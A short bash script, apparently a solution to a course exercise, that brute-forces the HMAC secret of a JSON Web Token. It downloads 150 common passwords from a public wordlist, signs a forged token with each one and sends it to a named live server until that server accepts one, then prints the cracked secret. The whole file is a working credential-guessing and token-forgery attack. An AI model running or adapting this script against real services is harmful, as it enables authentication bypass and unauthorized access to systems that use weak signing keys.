#!/bin/bash

HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD="{}"
B64_HEADER=$(echo -n "$HEADER" | base64 | tr '+' '-' | tr '/' '_' | tr -d '=')
B64_PAYLOAD=$(echo -n "$PAYLOAD" | base64 | tr '+' '-' | tr '/' '_' | tr -d '=')

PASSWORDS=$(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt | head -n 150)

for PASSWORD in $PASSWORDS; do
    SIGNATURE=$(echo -n "${B64_HEADER}.${B64_PAYLOAD}" | openssl dgst -sha256 -hmac "$PASSWORD" -binary | base64 | tr '+' '-' | tr '/' '_' | tr -d '=')
    JWT="${B64_HEADER}.${B64_PAYLOAD}.${SIGNATURE}"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $JWT" https://learn.operatoroverload.com/~jmadar/jwt-client/q2.sh)

    if [ "$RESPONSE" -eq 200 ]; then 
        echo "The secret is $PASSWORD"
        break
    fi
done